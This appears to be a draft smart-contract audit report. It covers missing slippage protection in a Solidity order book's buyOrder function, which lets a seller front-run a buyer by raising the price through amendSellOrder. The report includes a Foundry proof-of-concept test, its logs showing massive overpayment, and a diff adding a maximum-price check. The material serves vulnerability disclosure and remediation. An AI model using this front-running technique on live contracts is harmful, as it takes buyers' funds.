to check:

1. price manipulation + no slippage protection for buyer, allowing sellers to increase the price right before a buyer attempts to purchase which the seller could front-run and amend the price to a much higher value. lack of slippage protection in buyOrder function means buyer could pay much more than expected
2. deadline extension exploit, dk if this is intended or not

# Lack of Slippage Protection in `buyOrder` Results in Sellers Being Able To Manipulate and Drastically Increase Prices Using `amendSellOrder` For Buyers

## Description

- In a normal scenario, sellers would use the `amendSellOrder` function with integrity and only when there is a genuine need to update the terms of the order. Buyers would also expect to pay the price listed in the current order.
- Due to lack of defence against Price Manipulation, sellers would be able to monitor the mempool for relevant transactions or use MEV bots to front run a `amendSellOrder` transaction to drastically increase the price of their order, causing the buyer to pay a lot more than he intended to. The lack of slippage protection in `buyOrder` results in buyers potentially paying a lot more than intended

```solidity
@>    function buyOrder(uint256 _orderId) public { // lack of slippage protection within the function
        Order storage order = orders[_orderId];

        // Validation checks
        if (order.seller == address(0)) revert OrderNotFound();
        if (!order.isActive) revert OrderNotActive();
        if (block.timestamp >= order.deadlineTimestamp) revert OrderExpired();

        order.isActive = false;
        uint256 protocolFee = (order.priceInUSDC * FEE) / PRECISION;
        uint256 sellerReceives = order.priceInUSDC - protocolFee;

        iUSDC.safeTransferFrom(msg.sender, address(this), protocolFee);
        iUSDC.safeTransferFrom(msg.sender, order.seller, sellerReceives);
        IERC20(order.tokenToSell).safeTransfer(msg.sender, order.amountToSell);

        totalFees += protocolFee;

        emit OrderFilled(_orderId, msg.sender, order.seller);
    }
```

## Risk

**Likelihood**: High

- Sellers can easily monitor the mempool or amke use of existing MEV infrastructure to monitor for purchases on their orders, and front run a transaction to increase the price

**Impact**: High

- Buyers would pay a lot more than intended, and can effectively be seen as a method to "rob" buyers.

## Proof of Concept

```solidity
    function testBasicPriceManipulationAttack() public {
        console2.log("=== Basic Price Manipulation Attack ===");

        // 1. Malicious seller creates attractive order
        vm.startPrank(alice);
        wbtc.approve(address(book), 2e8);
        uint256 aliceId = book.createSellOrder(address(wbtc), 2e8, 1e6, 2 days); // extremely cheap offer
        vm.stopPrank();

        // 2. Simulate mempool detection - seller sees buyer's transaction
        // In reality, this would be done by monitoring mempool
        console2.log("\n[ATTACK] Seller detects incoming buy transaction in mempool");

        // 3. Seller front-runs with price amendment
        vm.prank(alice);
        book.amendSellOrder(aliceId, 2e8, 200_000e6, 2 days);
        string memory aliceOrderDetails = book.getOrderDetailsString(aliceId);
        console2.log(aliceOrderDetails);

        // 4. Buyer's transaction executes at manipulated price
        uint256 buyerUSDCBefore = usdc.balanceOf(dan);
        uint256 buyerWBTCBefore = wbtc.balanceOf(dan);

        vm.startPrank(dan);
        usdc.approve(address(book), 200_000e6);
        book.buyOrder(aliceId);
        vm.stopPrank();

        uint256 buyerUSDCAfter = usdc.balanceOf(dan);
        uint256 buyerWBTCAfter = wbtc.balanceOf(dan);

        console2.log("\nBuyer transaction completed:");
        console2.log("- USDC spent:", buyerUSDCBefore - buyerUSDCAfter);
        console2.log("- WBTC received:", buyerWBTCAfter - buyerWBTCBefore);
        console2.log("- Expected to pay: 1000000");
        console2.log("- Actually paid:", buyerUSDCBefore - buyerUSDCAfter);
        console2.log("- Overpaid by:", (buyerUSDCBefore - buyerUSDCAfter) - 1e6);

        assertEq(buyerUSDCBefore - buyerUSDCAfter, 200_000e6);
        assertEq(buyerWBTCAfter - buyerWBTCBefore, 2e8);
    }
```

Logs output:
Buyer transaction completed:

- USDC spent: 200000000000
- WBTC received: 200000000
- Expected to pay: 1000000
- Actually paid: 200000000000
- Overpaid by: 199999000000

## Recommended Mitigation

Integrating slippage protection within the `buyOrder` function would prevent this attack from happening, assuming that buyers input the `_maxPriceAccepted` appropriately.

```diff
-function buyOrder(uint256 _orderId) public {
+function buyOrder(uint256 _orderId, uint256 _maxPriceAccepted) public {
        Order storage order = orders[_orderId];

        if (order.seller == address(0)) revert OrderNotFound();
        if (!order.isActive) revert OrderNotActive();
        if (block.timestamp >= order.deadlineTimestamp) revert OrderExpired();

        // SLIPPAGE PROTECTION: Check if current price exceeds buyer's maximum
+        if (order.priceInUSDC > _maxPriceAccepted) {
+            revert SlippageExceeded();
+        }

        order.isActive = false;
        uint256 protocolFee = (order.priceInUSDC * FEE) / PRECISION;
        uint256 sellerReceives = order.priceInUSDC - protocolFee;

        iUSDC.safeTransferFrom(msg.sender, address(this), protocolFee);
        iUSDC.safeTransferFrom(msg.sender, order.seller, sellerReceives);
        IERC20(order.tokenToSell).safeTransfer(msg.sender, order.amountToSell);

        totalFees += protocolFee;
        emit OrderFilled(_orderId, msg.sender, order.seller, order.priceInUSDC);
    }
```
